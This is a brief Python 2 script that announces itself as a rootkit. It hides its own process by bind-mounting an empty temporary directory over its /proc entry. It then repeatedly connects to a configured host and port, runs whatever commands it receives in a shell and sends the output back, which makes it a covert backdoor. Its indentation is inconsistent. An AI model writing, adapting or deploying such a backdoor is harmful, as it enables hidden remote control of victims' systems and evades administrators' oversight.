#!/usr/bin/python

import os
import socket
import subprocess
import string
import time
import random as r

name = string.lowercase + string.uppercase + string.digits 
token = "".join(r.choice(name) for i in range(10)) 
pid = os.getpid() 
os.system("mkdir /tmp/{1} &amp;&amp; mount -o bind /tmp/{1} /proc/{0}".format(pid, token))
host = "127.0.0.1" 
port = 666 

print "#####################"
print "Rootkit started . . ." 
print "Listening on {}:{}".format(host, port)

def tryToConnect(h, p): 
    try: 
		time.sleep(5) 
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((h, p))
		while True:
				command =  sock.recv(1024)
			        if command.strip("\n") == "exit":
				     print "See you later !"	
                		     sock.close() 
       			        proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) 
        			proc_result = proc.stdout.read() + proc.stderr.read() 
        			sock.send(proc_result) 
    except socket.error:
		pass  
while True:
	tryToConnect(host, port)
